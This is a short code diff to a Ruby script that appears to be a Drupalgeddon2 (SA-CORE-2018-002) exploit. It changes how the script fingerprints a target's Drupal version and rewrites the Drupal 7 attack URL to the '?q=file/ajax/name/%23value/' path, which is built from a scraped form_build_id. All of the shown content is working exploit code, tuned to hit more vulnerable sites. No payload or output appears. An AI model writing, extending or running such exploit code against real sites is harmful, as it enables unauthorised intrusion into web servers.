@@ -79,7 +79,7 @@ url.each do|uri|
     # Patched already?
     puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
 
-    drupalverion = response.body.match(/Drupal (.*),/).to_s().slice(/Drupal (.*),/, 1).strip
+    drupalverion = response.body.match(/Drupal (.*)[, ]/).to_s().slice(/Drupal (.*)[, ]/, 1).strip
     puts "[+] Drupal!: #{drupalverion}"
     # Done!
     break
@@ -145,7 +145,7 @@ if drupalverion.start_with?('7')
   response = http.request(req)
 
   form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).strip
-  url = target + "file/ajax/name/%23value/" + form_build_id
+  url = target + "?q=file/ajax/name/%23value/" + form_build_id
   uri = URI(url)
   payload = "form_build_id=" + form_build_id
 end
